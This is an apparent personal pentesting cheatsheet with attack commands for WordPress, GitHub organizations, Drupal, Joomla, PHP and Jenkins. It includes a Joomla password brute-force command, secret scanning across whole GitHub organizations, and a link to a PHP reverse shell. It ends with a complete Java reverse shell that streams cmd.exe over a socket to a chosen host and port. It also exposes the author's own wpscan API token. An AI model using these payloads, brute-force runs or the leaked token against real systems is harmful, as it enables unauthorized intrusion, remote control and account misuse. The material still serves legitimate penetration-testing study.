---
layout: blank
pagetitle: Attacking Services
---


**The best methodology for pentesting services is to usually just search "Pentesting {service name}"**

[https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file](https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file)
- Scroll down for services scanning

Wordpress
- `wpscan --url {url} -e u,vp,vt --plugins-detection aggressive --api-token lT8xySbw7gMN4a2SoFlwpEXI8BzPdEyDn1GAcdaGKAE`
  - Yes this is my wpscan free account api token with a whopping 25 scans per day

Github
- Use `gato-x` to enumerate entire organizations
  - [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
  - `gato-x enum --target {org_name}`
    - Requires a `GH_TOKEN` environment variable; just add `export GH_TOKEN="{token}"` to shell config file
- Use `noseyparker` to scan entire organizations for passwords
  - [https://github.com/praetorian-inc/noseyparker](https://github.com/praetorian-inc/noseyparker)
  - `noseyparker scan --github-org={org_name}`

Drupal
- `droopescan scan drupal -u {url}`

Joomla
- `droopescan scan joomla -u {url}`
- `sudo python3 joomla-brute.py -u {url} -w passwords.txt -usr {username}
    - [https://github.com/ajnik/joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)

PHP
- [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) - reverse shell (cross platform)

Jenkins
- Reverse shell:

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```